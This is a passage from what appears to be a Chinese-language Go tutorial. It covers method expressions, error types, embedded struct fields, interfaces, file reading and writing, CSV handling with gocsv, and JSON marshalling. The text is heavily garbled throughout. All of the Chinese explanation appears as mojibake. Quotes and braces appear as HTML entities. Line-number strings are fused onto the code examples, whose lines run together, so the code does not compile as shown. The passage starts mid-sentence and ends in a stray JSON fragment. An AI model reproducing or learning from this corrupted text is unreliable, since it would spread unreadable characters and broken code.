å’Œ *S æ–¹æ³•é›†åŒ…å« T + *T æ–¹æ³•ã€‚ â€¢ ä¸ç®¡åµŒå…¥ T æˆ– *Tï¼Œ*S æ–¹æ³•é›†æ€»æ˜¯åŒ…å« T + *T æ–¹æ³•ã€‚ ç”¨å®ä¾‹ value å’Œ pointer è°ƒç”¨æ–¹æ³• (å«åŒ¿åå­—æ®µ) ä¸å—æ–¹æ³•é›†çº¦æŸï¼Œç¼–è¯‘å™¨æ€»æ˜¯æŸ¥æ‰¾å…¨éƒ¨æ–¹æ³•ï¼Œå¹¶è‡ªåŠ¨è½¬æ¢ receiver å®å‚ã€‚ Go è¯­è¨€ä¸­å†…éƒ¨ç±»å‹æ–¹æ³•é›†æå‡çš„è§„åˆ™ï¼š è¡¨è¾¾å¼Golang è¡¨è¾¾å¼ ï¼šæ ¹æ®è°ƒç”¨è€…ä¸åŒï¼Œæ–¹æ³•åˆ†ä¸ºä¸¤ç§è¡¨ç°å½¢å¼: 1instance.method(args...) ---&gt; &lt;type&gt;.func(instance, args...) å‰è€…ç§°ä¸º method valueï¼Œåè€… method expressionã€‚ ä¸¤è€…éƒ½å¯åƒæ™®é€šå‡½æ•°é‚£æ ·èµ‹å€¼å’Œä¼ å‚ï¼ŒåŒºåˆ«åœ¨äº method value ç»‘å®šå®ä¾‹ï¼Œè€Œ method expression åˆ™é¡»æ˜¾å¼ä¼ å‚ã€‚ 1234567891011121314151617181920212223package mainimport &quot;fmt&quot;type User struct &#123; id int name string&#125;func (self *User) Test() &#123; fmt.Printf(&quot;%p, %v &quot;, self, self)&#125;func main() &#123; u := User&#123;1, &quot;Tom&quot;&#125; u.Test() mValue := u.Test mValue() // éšå¼ä¼ é€’ receiver mExpression := (*User).Test mExpression(&amp;u) // æ˜¾å¼ä¼ é€’ receiver&#125; é”™è¯¯æ§åˆ¶è¿”å›é”™è¯¯å€¼123456789101112131415161718192021222324package mainimport (\t&quot;errors&quot;\t&quot;fmt&quot;)func divide(a, b int) (int, error) &#123;\tif b == 0 &#123; return 0, errors.New(&quot;é™¤æ•°ä¸èƒ½ä¸º0&quot;)\t&#125; else &#123; return a / b, nil\t&#125;&#125;func main() &#123;\td, err := divide(4, 0)\tif err != nil &#123; fmt.Println(&quot;é”™è¯¯ï¼š&quot;, err)\t&#125; else &#123; fmt.Println(&quot;ç»“æœï¼š&quot;, d)\t&#125;&#125; è‡ªå®šä¹‰é”™è¯¯ç±»å‹123456789101112131415161718192021222324252627package mainimport &quot;fmt&quot;type MyError struct &#123;\tWhen string\tWhat string&#125;func (e *MyError) Error() string &#123;\treturn fmt.Sprintf(&quot;åœ¨ %s å‘ç”Ÿé”™è¯¯: %s&quot;, e.When, e.What)&#125;func run() error &#123;\terr := &amp;MyError&#123; When: &quot;2020-10-20&quot;, What: &quot;ç¨‹åºå‡ºé”™&quot;,\t&#125;\treturn err&#125;func main() &#123;\terror := run()\tif error != nil &#123; fmt.Println(error)\t&#125;&#125; é¢å‘å¯¹è±¡åŒ¿åå­—æ®µgoæ”¯æŒåªæä¾›ç±»å‹è€Œä¸å†™å­—æ®µåçš„æ–¹å¼ï¼Œä¹Ÿå°±æ˜¯åŒ¿åå­—æ®µï¼Œä¹Ÿç§°ä¸ºåµŒå…¥å­—æ®µ 12345678910type Person struct &#123;\tname string\tsex byte\tage int&#125;type Student struct &#123;\tPerson\t// åŒ¿åå­—æ®µï¼Œåªæœ‰ç±»å‹ï¼Œæ²¡æœ‰åå­—ã€‚å®ƒç»§æ‰¿äº†Personçš„æ‰€æœ‰æˆå‘˜\tid int\taddr string&#125; åŒ¿åå­—æ®µåˆå§‹åŒ– 123456789// åˆå§‹åŒ–s1 := Student&#123;Person&#123;&quot;5lmh&quot;, &quot;man&quot;, 20&#125;, 1, &quot;bj&quot;&#125;fmt.Println(s1)s2 := Student&#123;Person: Person&#123;&quot;5lmh&quot;, &quot;man&quot;, 20&#125;&#125;fmt.Println(s2)s3 := Student&#123;Person: Person&#123;name: &quot;5lmh&quot;&#125;&#125;fmt.Println(s3) 123&#123;&#123;5lmh man 20&#125; 1 bj&#125; &#123;&#123;5lmh man 20&#125; 0 &#125; &#123;&#123;5lmh 0&#125; 0 &#125; åŒåå­—æ®µçš„æƒ…å†µ 1234567891011121314151617181920212223242526272829package mainimport &quot;fmt&quot;//äººtype Person struct &#123; name string sex string age int&#125;type Student struct &#123; Person id int addr string //åŒåå­—æ®µ name string&#125;func main() &#123; var s Student // ç»™è‡ªå·±å­—æ®µèµ‹å€¼äº† s.name = &quot;5lmh&quot; fmt.Println(s) // è‹¥ç»™çˆ¶ç±»åŒåå­—æ®µèµ‹å€¼ï¼Œå¦‚ä¸‹ s.Person.name = &quot;æ¯è—¤&quot; fmt.Println(s)&#125; è¾“å‡ºç»“æœï¼š 12&#123;&#123; 0&#125; 0 5lmh&#125;&#123;&#123;æ¯è—¤ 0&#125; 0 5lmh&#125; æ‰€æœ‰çš„å†…ç½®ç±»å‹å’Œè‡ªå®šä¹‰ç±»å‹éƒ½æ˜¯å¯ä»¥ä½œä¸ºåŒ¿åå­—æ®µå»ä½¿ç”¨ 12345678910111213141516171819202122232425package mainimport &quot;fmt&quot;//äººtype Person struct &#123; name string sex string age int&#125;// è‡ªå®šä¹‰ç±»å‹type mystr string// å­¦ç”Ÿtype Student struct &#123; Person int mystr&#125;func main() &#123; s1 := Student&#123;Person&#123;&quot;5lmh&quot;, &quot;man&quot;, 18&#125;, 1, &quot;bj&quot;&#125; fmt.Println(s1)&#125; è¾“å‡ºç»“æœï¼š 1&#123;&#123;5lmh man 18&#125; 1 bj&#125; æŒ‡é’ˆç±»å‹åŒ¿åå­—æ®µ 123456789101112131415161718192021222324package mainimport &quot;fmt&quot;//äººtype Person struct &#123; name string sex string age int&#125;// å­¦ç”Ÿtype Student struct &#123; *Person id int addr string&#125;func main() &#123; s1 := Student&#123;&amp;Person&#123;&quot;5lmh&quot;, &quot;man&quot;, 18&#125;, 1, &quot;bj&quot;&#125; fmt.Println(s1) fmt.Println(s1.name) fmt.Println(s1.Person.name)&#125; è¾“å‡ºç»“æœï¼š 123&#123;0x140001220c0 1 bj&#125;5lmh5lmh æ¥å£æ¥å£ï¼ˆinterfaceï¼‰æ˜¯ Go è¯­è¨€ä¸­çš„ä¸€ç§ç±»å‹ï¼Œç”¨äºå®šä¹‰è¡Œä¸ºçš„é›†åˆï¼Œå®ƒé€šè¿‡æè¿°ç±»å‹å¿…é¡»å®ç°çš„æ–¹æ³•ï¼Œè§„å®šäº†ç±»å‹çš„è¡Œä¸ºå¥‘çº¦ã€‚ Go è¯­è¨€æä¾›äº†å¦å¤–ä¸€ç§æ•°æ®ç±»å‹å³æ¥å£ï¼Œå®ƒæŠŠæ‰€æœ‰çš„å…·æœ‰å…±æ€§çš„æ–¹æ³•å®šä¹‰åœ¨ä¸€èµ·ï¼Œä»»ä½•å…¶ä»–ç±»å‹åªè¦å®ç°äº†è¿™äº›æ–¹æ³•å°±æ˜¯å®ç°äº†è¿™ä¸ªæ¥å£ã€‚ Go çš„æ¥å£è®¾è®¡ç®€å•å´åŠŸèƒ½å¼ºå¤§ï¼Œæ˜¯å®ç°å¤šæ€å’Œè§£è€¦çš„é‡è¦å·¥å…·ã€‚ æ¥å£å¯ä»¥è®©æˆ‘ä»¬å°†ä¸åŒçš„ç±»å‹ç»‘å®šåˆ°ä¸€ç»„å…¬å…±çš„æ–¹æ³•ä¸Šï¼Œä»è€Œå®ç°å¤šæ€å’Œçµæ´»çš„è®¾è®¡ã€‚ å®ç°ï¼š Go ä¸­æ²¡æœ‰å…³é”®å­—æ˜¾å¼å£°æ˜æŸä¸ªç±»å‹å®ç°äº†æŸä¸ªæ¥å£ã€‚ åªè¦ä¸€ä¸ªç±»å‹å®ç°äº†æ¥å£è¦æ±‚çš„æ‰€æœ‰æ–¹æ³•ï¼Œè¯¥ç±»å‹å°±è‡ªåŠ¨è¢«è®¤ä¸ºå®ç°äº†è¯¥æ¥å£ã€‚ æ¥å£ç±»å‹å˜é‡ï¼š æ¥å£å˜é‡å¯ä»¥å­˜å‚¨å®ç°è¯¥æ¥å£çš„ä»»æ„å€¼ã€‚ æ¥å£å˜é‡å®é™…ä¸ŠåŒ…å«äº†ä¸¤ä¸ªéƒ¨åˆ†ï¼š åŠ¨æ€ç±»å‹ï¼šå­˜å‚¨å®é™…çš„å€¼ç±»å‹ã€‚ åŠ¨æ€å€¼ï¼šå­˜å‚¨å…·ä½“çš„å€¼ã€‚ é›¶å€¼æ¥å£ï¼š æ¥å£çš„é›¶å€¼æ˜¯ nilã€‚ ä¸€ä¸ªæœªåˆå§‹åŒ–çš„æ¥å£å˜é‡å…¶å€¼ä¸º nilï¼Œä¸”ä¸åŒ…å«ä»»ä½•åŠ¨æ€ç±»å‹æˆ–å€¼ã€‚ ç©ºæ¥å£ï¼š å®šä¹‰ä¸º interface&#123;&#125;ï¼Œå¯ä»¥è¡¨ç¤ºä»»ä½•ç±»å‹ã€‚ æ¥å£çš„å¸¸è§ç”¨æ³• å¤šæ€ï¼šä¸åŒç±»å‹å®ç°åŒä¸€æ¥å£ï¼Œå®ç°å¤šæ€è¡Œä¸ºã€‚ è§£è€¦ï¼šé€šè¿‡æ¥å£å®šä¹‰ä¾èµ–å…³ç³»ï¼Œé™ä½æ¨¡å—ä¹‹é—´çš„è€¦åˆã€‚ æ³›åŒ–ï¼šä½¿ç”¨ç©ºæ¥å£ interface&#123;&#125; è¡¨ç¤ºä»»æ„ç±»å‹ã€‚ å®šä¹‰æ¥å£ 1234type Shape interface &#123; Area() float64 Perimeter() float64&#125; Shape æ˜¯ä¸€ä¸ªæ¥å£ï¼Œå®šä¹‰äº†ä¸¤ä¸ªæ–¹æ³•ï¼šArea å’Œ Perimeterã€‚ ä»»æ„ç±»å‹åªè¦å®ç°äº†è¿™ä¸¤ä¸ªæ–¹æ³•ï¼Œå°±è¢«è®¤ä¸ºå®ç°äº† Shape æ¥å£ã€‚ å®ç°æ¥å£: ç±»å‹é€šè¿‡å®ç°æ¥å£è¦æ±‚çš„æ‰€æœ‰æ–¹æ³•æ¥å®ç°æ¥å£ã€‚ 123456789101112//å®šä¹‰ä¸€ä¸ªåœ†type Circle struct &#123; Radius float64&#125;// Circleç±»å‹å®ç°Shapeæ¥å£(å®ç°äº†Areaå’ŒPerimeteræ–¹æ³•)func (c Circle) Area() float64 &#123; return math.Pi * c.Radius * c.Radius&#125;func (c Circle) Perimeter() float64 &#123; return 2 * math.Pi * c.Radius&#125; åˆå§‹åŒ–æ¥å£ï¼š 1var s Shape = Circle&#123;Radius: 1&#125; //æ¥å£å˜é‡å¯ä»¥å­˜å‚¨å®ç°äº†æ¥å£çš„ç±»å‹çš„å¯¹è±¡ å½“ä¸€ä¸ªç±»å‹ä½äºä¸€ä¸ªæ¥å£çš„ç±»å‹é›†å†…ï¼Œä¸”è¯¥ç±»å‹çš„å€¼å¯ä»¥ç”±è¯¥æ¥å£ç±»å‹çš„å˜é‡å­˜å‚¨ï¼Œé‚£ä¹ˆç§°è¯¥ç±»å‹å®ç°äº†è¯¥æ¥å£ã€‚ å®Œæ•´ä»£ç  12345678910111213141516171819202122232425262728293031package mainimport (\t&quot;fmt&quot;\t&quot;math&quot;)//å®šä¹‰æ¥å£type Shape interface &#123; Area() float64 Perimeter() float64&#125;//å®šä¹‰ä¸€ä¸ªåœ†type Circle struct &#123; Radius float64&#125;// Circleç±»å‹å®ç°Shapeæ¥å£(å®ç°äº†Areaå’ŒPerimeteræ–¹æ³•)func (c Circle) Area() float64 &#123; return math.Pi * c.Radius * c.Radius&#125;func (c Circle) Perimeter() float64 &#123; return 2 * math.Pi * c.Radius&#125;func main() &#123; var s Shape = Circle&#123;Radius: 1&#125; //æ¥å£å˜é‡å¯ä»¥å­˜å‚¨å®ç°äº†æ¥å£çš„ç±»å‹çš„å¯¹è±¡ fmt.Println(&quot;Area: &quot;, s.Area()) fmt.Println(&quot;Perimeter: &quot;, s.Perimeter())&#125; æ–‡ä»¶æ“ä½œæ‰“å¼€æ–‡ä»¶å¸¸è§çš„ä¸¤ç§æ‰“å¼€æ–‡ä»¶çš„æ–¹å¼æ˜¯ä½¿ç”¨osåŒ…æä¾›çš„ä¸¤ä¸ªå‡½æ•°ï¼ŒOpenå‡½æ•°è¿”å›å€¼ä¸€ä¸ªæ–‡ä»¶æŒ‡é’ˆå’Œä¸€ä¸ªé”™è¯¯ï¼Œå¸¸è§çš„ä¸¤ç§æ‰“å¼€æ–‡ä»¶çš„æ–¹å¼æ˜¯ä½¿ç”¨osåŒ…æä¾›çš„ä¸¤ä¸ªå‡½æ•°ï¼ŒOpenå‡½æ•°è¿”å›å€¼ä¸€ä¸ªæ–‡ä»¶æŒ‡é’ˆå’Œä¸€ä¸ªé”™è¯¯ï¼Œæ–‡ä»¶çš„æŸ¥æ‰¾è·¯å¾„é»˜è®¤ä¸ºé¡¹ç›®go.modæ–‡ä»¶æ‰€åœ¨çš„è·¯å¾„ã€‚ 12345678910// è¯»å–æ–‡ä»¶ Openä»…ä»…åªæ˜¯åªè¯»çš„ï¼Œæ— æ³•è¢«ä¿®æ”¹file, err := os.Open(&quot;1.txt&quot;)if os.IsNotExist(err) &#123;\tfmt.Println(&quot;File not found&quot;)&#125; else if err != nil &#123;\tlog.Fatal(err)&#125; else &#123;\tfmt.Println(&quot;File found:&quot;, file)\tdefer file.Close()&#125; é€šè¿‡OpenFileå‡½æ•°å¯ä»¥æ§åˆ¶æ›´å¤šç»†èŠ‚ï¼Œä¾‹å¦‚ä¿®æ”¹æ–‡ä»¶æè¿°ç¬¦å’Œæ–‡ä»¶æƒé™ï¼Œå…³äºæ–‡ä»¶æè¿°ç¬¦ï¼ŒosåŒ…ä¸‹æä¾›äº†ä»¥ä¸‹å¸¸é‡ä»¥ä¾›ä½¿ç”¨ã€‚ 123456789101112const ( // åªè¯»ï¼Œåªå†™ï¼Œè¯»å†™ ä¸‰ç§å¿…é¡»æŒ‡å®šä¸€ä¸ª O_RDONLY int = syscall.O_RDONLY // ä»¥åªè¯»çš„æ¨¡å¼æ‰“å¼€æ–‡ä»¶ O_WRONLY int = syscall.O_WRONLY // ä»¥åªå†™çš„æ¨¡å¼æ‰“å¼€æ–‡ä»¶ O_RDWR int = syscall.O_RDWR // ä»¥è¯»å†™çš„æ¨¡å¼æ‰“å¼€æ–‡ä»¶ // å‰©ä½™çš„å€¼ç”¨äºæ§åˆ¶è¡Œä¸º O_APPEND int = syscall.O_APPEND // å½“å†™å…¥æ–‡ä»¶æ—¶ï¼Œå°†æ•°æ®æ·»åŠ åˆ°æ–‡ä»¶æœ«å°¾ O_CREATE int = syscall.O_CREAT // å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨åˆ™åˆ›å»ºæ–‡ä»¶ O_EXCL int = syscall.O_EXCL // ä¸O_CREATEä¸€èµ·ä½¿ç”¨, æ–‡ä»¶å¿…é¡»ä¸å­˜åœ¨ O_SYNC int = syscall.O_SYNC // ä»¥åŒæ­¥IOçš„æ–¹å¼æ‰“å¼€æ–‡ä»¶ O_TRUNC int = syscall.O_TRUNC // å½“æ‰“å¼€çš„æ—¶å€™æˆªæ–­å¯å†™çš„æ–‡ä»¶) å…³äºæ–‡ä»¶æƒé™çš„åˆ™æä¾›äº†ä»¥ä¸‹å¸¸é‡ã€‚ 1234567891011121314151617181920const ( ModeDir = fs.ModeDir // d: ç›®å½• ModeAppend = fs.ModeAppend // a: åªèƒ½æ·»åŠ  ModeExclusive = fs.ModeExclusive // l: ä¸“ç”¨ ModeTemporary = fs.ModeTemporary // T: ä¸´æ—¶æ–‡ä»¶ ModeSymlink = fs.ModeSymlink // L: ç¬¦å·é“¾æ¥ ModeDevice = fs.ModeDevice // D: è®¾å¤‡æ–‡ä»¶ ModeNamedPipe = fs.ModeNamedPipe // p: å…·åç®¡é“ (FIFO) ModeSocket = fs.ModeSocket // S: Unix åŸŸå¥—æ¥å­— ModeSetuid = fs.ModeSetuid // u: setuid ModeSetgid = fs.ModeSetgid // g: setgid ModeCharDevice = fs.ModeCharDevice // c: Unix å­—ç¬¦è®¾å¤‡, å‰ææ˜¯è®¾ç½®äº† ModeDevice ModeSticky = fs.ModeSticky // t: é»æ»ä½ ModeIrregular = fs.ModeIrregular // ?: éå¸¸è§„æ–‡ä»¶ // ç±»å‹ä½çš„æ©ç . å¯¹äºå¸¸è§„æ–‡ä»¶è€Œè¨€ï¼Œä»€ä¹ˆéƒ½ä¸ä¼šè®¾ç½®. ModeType = fs.ModeType ModePerm = fs.ModePerm // Unix æƒé™ä½, 0o777) ä¸‹é¢æ˜¯ä¸€ä¸ªä»¥è¯»å†™æ¨¡å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶çš„ä»£ç ä¾‹å­ï¼Œæƒé™ä¸º0666ï¼Œè¡¨ç¤ºä¸ºæ‰€æœ‰äººéƒ½å¯ä»¥å¯¹è¯¥æ–‡ä»¶è¿›è¡Œè¯»å†™ï¼Œä¸”ä¸å­˜åœ¨æ—¶ä¼šè‡ªåŠ¨åˆ›å»ºã€‚ 12345678file2, err := os.OpenFile(&quot;README.md&quot;, os.O_RDWR|os.O_CREATE, 0666)if os.IsNotExist(err) &#123;\tfmt.Println(&quot;File not found&quot;)&#125; else if err != nil &#123;\tlog.Fatal(err)&#125; else &#123;\tfmt.Println(&quot;File found:&quot;, file2.Name())&#125; å€˜è‹¥åªæ˜¯æƒ³è·å–è¯¥æ–‡ä»¶çš„ä¸€äº›ä¿¡æ¯ï¼Œå¹¶ä¸æƒ³è¯»å–è¯¥æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨os.Stat()å‡½æ•°è¿›è¡Œæ“ä½œï¼Œä»£ç ç¤ºä¾‹å¦‚ä¸‹ 123456info, err := os.Stat(&quot;README.md&quot;)\tif err != nil &#123; log.Fatal(err)\t&#125; else &#123; fmt.Println(fmt.Sprintf(&quot;File found:%+v&quot;, info))\t&#125; æ³¨æ„ æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶åæ°¸è¿œè¦è®°å¾—å…³é—­è¯¥æ–‡ä»¶ï¼Œé€šå¸¸å…³é—­æ“ä½œä¼šæ”¾åœ¨deferè¯­å¥é‡Œ 1defer file.Close() è¯»å–æ–‡ä»¶æ¯”è¾ƒç®€å•çš„ä¸¤ç§ os.ReadFileï¼Œio.ReadAll 123456bytes, err := os.ReadFile(&quot;1.txt&quot;)if err != nil &#123;\tlog.Fatal(err)&#125; else &#123;\tfmt.Println(string(bytes))&#125; io.ReadAll ä¸ os.ReadFile ä¸åŒçš„æ˜¯å®ƒæ¥å—çš„å‚æ•°ä¸æ˜¯æ–‡ä»¶è·¯å¾„ï¼Œè€Œæ˜¯ io.Reader æ¥å£çš„å®ç°,æ°å¥½os.OpenFile æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Œå®ƒè¿”å›çš„ *os.File ç±»å‹å°±å®ç°äº† io.Reader æ¥å£ 1234567891011121314f, err := os.Open(&quot;1.txt&quot;)\tif os.IsNotExist(err) &#123; fmt.Println(&quot;File not found&quot;)\t&#125; else if err != nil &#123; log.Fatal(err)\t&#125; else &#123; fmt.Println(&quot;File found:&quot;, f.Name()) all, err := io.ReadAll(f) if err != nil &#123; log.Fatal(err) &#125; else &#123; fmt.Println(string(all)) &#125;\t&#125; æ–‡ä»¶å†™å…¥os.Fileç»“æ„ä½“æä¾›äº†ä»¥ä¸‹å‡ ç§æ–¹æ³•ä»¥ä¾›å†™å…¥æ•°æ® 12345678// å†™å…¥å­—èŠ‚åˆ‡ç‰‡func (f *File) Write(b []byte) (n int, err error)// å†™å…¥å­—ç¬¦ä¸²func (f *File) WriteString(s string) (n int, err error)// ä»æŒ‡å®šä½ç½®å¼€å§‹å†™ï¼Œå½“ä»¥os.O_APPENDæ¨¡å¼æ‰“å¼€æ—¶ï¼Œä¼šè¿”å›é”™è¯¯func (f *File) WriteAt(b []byte, off int64) (n int, err error) å¦‚æœæƒ³è¦å¯¹ä¸€ä¸ªæ–‡ä»¶å†™å…¥æ•°æ®ï¼Œåˆ™å¿…é¡»ä»¥O_WRONLYæˆ–O_RDWRçš„æ¨¡å¼æ‰“å¼€ï¼Œå¦åˆ™æ— æ³•æˆåŠŸå†™å…¥æ–‡ä»¶ã€‚ 123456789101112131415f1, err := os.OpenFile(&quot;1.txt&quot;, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)\tif os.IsNotExist(err) &#123; fmt.Println(&quot;File not found&quot;)\t&#125; else if err != nil &#123; log.Fatal(err)\t&#125; else &#123; fmt.Println(&quot;File found:&quot;, f1.Name()) n, err := f1.WriteString(&quot;MakkaPakka &quot;) if err != nil &#123; log.Fatal(err) &#125; else &#123; fmt.Println(n) &#125; f1.Close()\t&#125; ç”¨ gocsv åº“å¯¹ csv æ–‡ä»¶è¿›è¡Œæ“ä½œgocsvåŒ…çš„æœ€åŸºæœ¬çš„ä½œç”¨å°±æ˜¯èƒ½å¤Ÿæ–¹ä¾¿çš„å°†csvå†…å®¹è½¬æ¢åˆ°å¯¹åº”çš„ç»“æ„ä½“ä¸Šï¼Œæˆ–è€…å°†ç»“æ„ä½“çš„å†…å®¹å¿«é€Ÿçš„è½¬æ¢æˆcsvæ ¼å¼ï¼ˆåŒ…æ‹¬å†™å…¥æ–‡ä»¶ï¼‰ã€‚ 1234client_id,client_name,client_age1,Jose,422,Daniel,263,Vincent,32 gocsv.UnmarshalFileå‡½æ•°ï¼šcsvå†…å®¹è½¬æˆç»“æ„ä½“ã€‚ æˆ‘ä»¬å¯ä»¥ä»æ–‡ä»¶ä¸­è¯»å–å‡ºå†…å®¹ï¼Œå¹¶ç›´æ¥è½¬æ¢åˆ°ç»“æ„ä½“Clientä¸Šï¼Œå¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536package mainimport (\t&quot;fmt&quot;\t&quot;os&quot;\t&quot;github.com/gocarina/gocsv&quot;)type NotUsed struct &#123;\tName string&#125;type Client struct &#123; // Our example struct, you can use &quot;-&quot; to ignore a field\tId string `csv:&quot;client_id&quot;`\tName string `csv:&quot;client_name&quot;`\tAge string `csv:&quot;client_age&quot;`\tNotUsedString string `csv:&quot;-&quot;`\tNotUsedStruct NotUsed `csv:&quot;-&quot;`&#125;func main() &#123;\tclientsFile, err := os.OpenFile(&quot;1.csv&quot;, os.O_RDWR|os.O_CREATE, os.ModePerm)\tif err != nil &#123; panic(err)\t&#125;\tdefer clientsFile.Close()\tclients := []*Client&#123;&#125;\tif err := gocsv.UnmarshalFile(clientsFile, &amp;clients); err != nil &#123; // Load clients from file panic(err)\t&#125;\tfor _, client := range clients &#123; fmt.Println(&quot;Hello&quot;, client.Name)\t&#125;&#125; gocsv.MarshalFileå‡½æ•°ï¼šç»“æ„ä½“è½¬æˆcsvæ–‡ä»¶ 1234567891011121314151617181920212223242526272829303132333435363738394041package mainimport ( &quot;fmt&quot; &quot;os&quot; &quot;github.com/gocarina/gocsv&quot;)type NotUsed struct &#123; Name string&#125;type Client struct &#123; // Our example struct, you can use &quot;-&quot; to ignore a field Id string `csv:&quot;client_id&quot;` Name string `csv:&quot;client_name&quot;` Age string `csv:&quot;client_age&quot;` NotUsedString string `csv:&quot;-&quot;` NotUsedStruct NotUsed `csv:&quot;-&quot;` &#125;func main() &#123; clientsFile, err := os.OpenFile(&quot;clients.csv&quot;, os.O_RDWR|os.O_CREATE, os.ModePerm) if err != nil &#123; panic(err) &#125; defer clientsFile.Close() clients := []*Client&#123;&#125; clients = append(clients, &amp;Client&#123;Id: &quot;12&quot;, Name: &quot;John&quot;, Age: &quot;21&quot;&#125;) // Add clients clients = append(clients, &amp;Client&#123;Id: &quot;13&quot;, Name: &quot;Fred&quot;&#125;) clients = append(clients, &amp;Client&#123;Id: &quot;14&quot;, Name: &quot;James&quot;, Age: &quot;32&quot;&#125;) clients = append(clients, &amp;Client&#123;Id: &quot;15&quot;, Name: &quot;Danny&quot;&#125;) err = gocsv.MarshalFile(&amp;clients, clientsFile) // Use this to save the CSV back to the file if err != nil &#123; panic(err) &#125;&#125; gocsvåŒ…è¿˜å¯ä»¥ç»™è‡ªå®šä¹‰çš„ç»“æ„ä½“ç±»å‹å®šä¹‰csvå’Œç»“æ„ä½“çš„äº’è½¬å‡½æ•°ã€‚åªè¦è‡ªå®šä¹‰çš„ç±»å‹å®ç°å¦‚ä¸‹æ¥å£å³å¯ï¼š 123456789type TypeMarshaller interface &#123;\tMarshalCSV() (string, error)&#125;// TypeUnmarshaller is implemented by any value that has an UnmarshalCSV method// This converter is used to convert a string to your value representation of that stringtype TypeUnmarshaller interface &#123;\tUnmarshalCSV(string) error&#125; æˆ–è€…å°†ç»“æ„ä½“è½¬æ¢æˆcsvå­—ç¬¦ä¸²æ—¶ï¼Œéœ€è¦å®ç°å¦‚ä¸‹æ¥å£ï¼š 12345678// MarshalText encodes the receiver into UTF-8-encoded text and returns the result.type TextMarshaler interface &#123;\tMarshalText() (text []byte, err error)&#125;type TextUnmarshaler interface &#123;\tUnmarshalText(text []byte) error&#125; ä¾‹å¦‚ï¼Œæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªç»“æ„ä½“DateTimeï¼Œé‡Œé¢æœ‰ä¸€ä¸ªtime.Timeç±»å‹çš„å±æ€§ã€‚å¹¶ä¸”DateTimeç±»å‹å®ç°äº†TypeMarshalleræ¥å£çš„MarshalCSVå‡½æ•°å’ŒTypeUnmarshalleræ¥å£çš„UnmarshalCSVå‡½æ•°ã€‚å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031package mainimport (\t&quot;fmt&quot;\t&quot;github.com/gocarina/gocsv&quot;\t&quot;time&quot;)type DateTime struct &#123;\ttime.Time&#125;type Client struct &#123; // Our example struct, you can use &quot;-&quot; to ignore a field\tId string `csv:&quot;id&quot;`\tName string `csv:&quot;name&quot;`\tEmployed DateTime `csv:&quot;employed&quot;`&#125;func (date *DateTime) MarshalCSV() (string, error) &#123;\treturn date.Time.Format(&quot;2006å¹´01æœˆ02æ—¥&quot;), nil&#125;func main() &#123;\tclient := []Client&#123; &#123; Id: &quot;1&quot;, Name: &quot;Qin&quot;, Employed: DateTime&#123;time.Now()&#125;, &#125;&#125;\tcsvContent, _ := gocsv.MarshalString(client)\tfmt.Println(&quot;csv:&quot;, csvContent)&#125; Json æ“ä½œjsonåœ¨Restfulé£æ ¼çš„æ¥å£é€šä¿¡ä¸­ç»å¸¸ä¼šç”¨åˆ°ï¼Œå…¶ç›¸è¾ƒäºxmlæ›´è½»ä¾¿çš„å¤§å°ï¼Œä½å»‰çš„å­¦ä¹ æˆæœ¬ä½¿å…¶åœ¨webé¢†åŸŸç§°ä¸ºäº†ä¸»æµçš„æ•°æ®äº¤æ¢æ ¼å¼ã€‚ åœ¨ go ä¸­ï¼Œencoding/jsonåŒ…ä¸‹æä¾›å¯¹åº”çš„å‡½æ•°æ¥è¿›è¡Œ json çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ï¼Œä¸»è¦ä½¿ç”¨çš„æœ‰å¦‚ä¸‹å‡½æ•°ã€‚ 123func Marshal(v any) ([]byte, error) //å°†goå¯¹è±¡åºåˆ—åŒ–ä¸ºjsonå­—ç¬¦ä¸²func Unmarshal(data []byte, v any) error //å°†jsonå­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸ºgoå¯¹è±¡ 123456789101112131415161718192021222324252627282930// json æ“ä½œpackage mainimport (\t&quot;encoding/json&quot;\t&quot;fmt&quot;)type Person struct &#123;\tUserId string\tUsername string\tAge int\tAddress string&#125;func main() &#123;\tperson := Person&#123; UserId: &quot;120&quot;, Username: &quot;jack&quot;, Age: 18, Address: &quot;usa&quot;,\t&#125;\tmarshal, err := json.Marshal(person)\tif err != nil &#123; fmt.Println(err)\t&#125; else &#123; fmt.Println(string(marshal))\t&#125;&#125; è¾“å‡º 1&#123;&quot;UserId&quot;:&quot;120&quot;,&quot;Username&quot;:&quot;jack&quot;,&quot;Age&quot;:18,&quot;Address&quot;:&quot;usa&quot;&#125; æˆ‘ä»¬å¯ä»¥é€šè¿‡ç»“æ„ä½“æ ‡ç­¾æ¥è¾¾åˆ°é‡å‘½åçš„æ•ˆæœã€‚ 123456type Person struct &#123;\tUserId string `json:&quot;id&quot;`\tUsername string `json:&quot;user&quot;`\tAge int `json:&quot;age&quot;`\tAddress string `json:&quot;adr&quot;`&#125; è¾“å‡º 1&#123;&quot;id&quot;:&quot;120&quot;,&quot;user&quot;:&quot;jack&quot;,&quot;age&quot;:18,&quot;adr&quot;:&quot;usa&quot;&#125; ç¼©è¿› åºåˆ—åŒ–æ—¶é»˜è®¤æ˜¯æ²¡æœ‰ä»»ä½•ç¼©è¿›çš„ï¼Œè¿™æ˜¯ä¸ºäº†å‡å°‘ä¼ è¾“è¿‡ç¨‹çš„ç©ºé—´æŸè€—ï¼Œä½†æ˜¯è¿™å¹¶ä¸åˆ©äºäººä¸ºè§‚å¯Ÿï¼Œåœ¨ä¸€äº›æƒ…å†µä¸‹æˆ‘ä»¬éœ€è¦å°†å…¶åºåˆ—åŒ–æˆäººç±»èƒ½å¤Ÿè§‚å¯Ÿçš„å½¢å¼ã€‚ä¸ºæ­¤ï¼Œåªéœ€è¦æ¢ä¸€ä¸ªå‡½æ•°ã€‚ 1func MarshalIndent(v any, prefix, indent string) ([]byte, error) 1marshal, err := json.MarshalIndent(person, &quot;&quot;, &quot; &quot;) è¾“å‡º 123456&#123; &quot;UserId&quot;: &quot;120&quot;, &quot;Username&quot;: &quot;jack&quot;, &quot;Age&quot;: 18, &quot;Address&quot;: &quot;usa&quot;&#125;","tags":["go 